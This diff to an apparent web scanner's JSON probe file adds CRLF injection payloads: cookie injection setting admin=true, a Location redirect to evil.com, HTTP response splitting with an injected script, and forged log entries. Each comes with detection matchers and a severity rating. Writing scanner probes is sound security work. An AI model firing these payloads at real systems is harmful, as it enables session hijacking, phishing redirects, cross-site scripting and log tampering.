@@ -26,6 +26,41 @@
           "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "evil"}],
           "severity": "high",
           "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}}%0d%0aSet-Cookie: admin=true",
+          "description": "CRLF cookie injection via URL-encoded CRLF — inject admin cookie",
+          "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "admin"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}%0d%0aLocation: https://evil.com",
+          "description": "CRLF redirect injection — inject Location header to redirect victim",
+          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
+          "description": "HTTP response splitting — inject fake second HTTP response with XSS payload",
+          "matchers": [{"type": "word", "words": ["<script>alert(1)</script>"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "log_injection": {
+      "description": "CRLF log injection — inject fake log entries if logs are reflected or exposed",
+      "tech_match": [],
+      "param_match": ["user", "username", "name", "q", "search", "input", "url", "redirect"],
+      "probes": [
+        {
+          "payload": "{{baseline}}%0d%0a[CRITICAL] Unauthorized access detected",
+          "description": "CRLF log injection — if server logs the parameter and exposes logs, fake critical entry appears",
+          "matchers": [{"type": "word", "words": ["CRITICAL", "Unauthorized access detected"], "condition": "or"}],
+          "severity": "medium",
+          "confidence_boost": 25
         }
       ]
     }
